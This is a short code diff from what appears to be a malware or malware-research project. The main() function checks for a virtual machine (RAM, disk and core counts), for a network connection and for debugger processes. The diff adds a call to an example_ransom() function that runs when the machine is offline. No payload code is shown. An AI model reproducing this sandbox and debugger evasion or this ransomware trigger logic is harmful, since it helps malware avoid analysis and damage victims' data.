@@ -40,6 +40,7 @@ def main():
     if any([not vmDetect.is_enough_ram(),not vmDetect.is_enough_disk(), not vmDetect.is_enough_cores()]):
         vm_flag("EXITED ON ANY_SPEC CHECK")
     if not is_online():
+        example_ransom()
         vm_flag('NOT ONLINE')
     if debugEvasion.find_debug_process():
         vm_flag("we found debug process")
